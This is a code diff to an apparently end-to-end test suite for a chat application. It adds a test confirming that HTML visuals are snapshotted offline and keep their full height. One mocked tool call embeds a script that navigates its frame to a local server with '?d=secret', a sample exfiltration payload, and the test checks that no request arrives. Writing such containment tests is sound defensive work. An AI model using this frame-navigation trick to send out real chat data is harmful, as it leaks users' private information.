@@ -1,4 +1,6 @@
 import { readFile } from "node:fs/promises";
+import { createServer } from "node:http";
+import type { AddressInfo } from "node:net";
 import path from "node:path";
 import { expect, finishLmStudioOnboarding, test } from "./fixtures";
 
@@ -23,7 +25,7 @@ async function latestAssistant(root: string): Promise<StoredMessage | undefined>
   for (const meta of metas.filter((chat) => !chat.botId && chat.workspaceId !== "assistant")) {
     const chat = JSON.parse(await readFile(path.join(root, "chats", `${meta.id}.json`), "utf8")) as { messages: StoredMessage[] };
     const assistant = [...chat.messages].reverse().find((message) => message.role === "assistant");
-    if (assistant?.uiVisuals?.length) return assistant;
+    if (assistant?.uiVisuals?.length || assistant?.htmlArtifacts?.length) return assistant;
   }
   return undefined;
 }
@@ -93,4 +95,50 @@ test("a reply draws native and HTML visuals inline, and both get snapshots for p
   // The hidden capture window never became a visible application window.
   const visible = await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().filter((window) => window.isVisible()).length);
   expect(visible).toBe(1);
+});
+
+test("snapshots run guest HTML offline and keep everything down to its last margin", async ({ aiden }) => {
+  const { page, lmStudio, userDataDir } = aiden;
+  const hits: string[] = [];
+  const server = createServer((request, response) => {
+    hits.push(request.url ?? "");
+    response.end("<p>leaked</p>");
+  });
+  await new Promise<void>((resolve) => server.listen(0, "127.0.0.1", () => resolve()));
+  const { port } = server.address() as AddressInfo;
+  try {
+    await finishLmStudioOnboarding(page);
+    const prompt = "Snapshot containment scenario: draw two visuals.";
+    const scenario = lmStudio.enqueueToolScenario!({
+      prompt,
+      calls: [
+        // A visual that tries to send chat data away by navigating its own frame.
+        { name: "render_artifact", arguments: { title: "Leaky", html: `<p>hello</p><script>location.href = "http://127.0.0.1:${port}/leak?d=secret";</script>` } },
+        { name: "render_artifact", arguments: { title: "Tall margin", html: `<div style="height:300px;background:#0b7de5"></div><p style="margin:0 0 48px">End of visual</p>` } },
+      ],
+      finalText: "Both visuals are drawn.",
+    });
+    await page.locator("textarea").first().fill(prompt);
+    await page.getByRole("button", { name: "Send message" }).click();
+    await expect(page.getByText("Both visuals are drawn.", { exact: true }).first()).toBeVisible({ timeout: 45_000 });
+    expect(scenario.error).toBeUndefined();
+
+    // The queue captures in order, so the second snapshot means the first ran.
+    const tallSnapshot = async () => {
+      const message = await latestAssistant(userDataDir);
+      const tall = message?.htmlArtifacts?.find((artifact) => artifact.title === "Tall margin");
+      const ref = message?.visualSnapshots?.find((candidate) => candidate.visualId === tall?.mediaId);
+      return ref ? message?.attachments?.find((attachment) => attachment.id === ref.attachmentId) : undefined;
+    };
+    await expect.poll(async () => Boolean(await tallSnapshot()), { timeout: 30_000 }).toBe(true);
+    expect(hits).toEqual([]);
+
+    // Column width 720 plus 16px padding on each side, at the display's scale.
+    const size = pngSize((await tallSnapshot())!.data!);
+    const cssHeight = (size.height * 752) / size.width;
+    // 16 + 300 + one line of text + the 48px bottom margin + 16.
+    expect(cssHeight).toBeGreaterThanOrEqual(395);
+  } finally {
+    await new Promise<void>((resolve) => server.close(() => resolve()));
+  }
 });
